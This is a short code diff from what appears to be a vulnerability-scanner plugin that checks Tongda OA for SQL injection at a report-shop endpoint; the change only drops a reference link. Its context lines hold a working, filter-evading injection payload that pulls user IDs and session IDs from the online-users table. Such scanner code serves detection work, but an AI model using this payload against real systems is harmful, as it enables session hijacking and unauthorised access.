@@ -5,8 +5,7 @@ def verify(url):
     relsult = {
         'name': '通达OA sql注入(/general/reportshop/utils/get_datas.php)',
         'vulnerable': False,
-        'url': url,
-        'about': 'https://forum.butian.net/share/278',
+        'url': url
     }
     timeout = 3
     payload = r'''?USER_ID=OfficeTask&PASSWORD=&col=1,1&tab=5%20whe\re%201={`\=%27`%201}%20un\ion%20(s\elect%20uid,sid%20fr\om%20user_online%20whe\re%201\={`=`%201})--%20%27'''
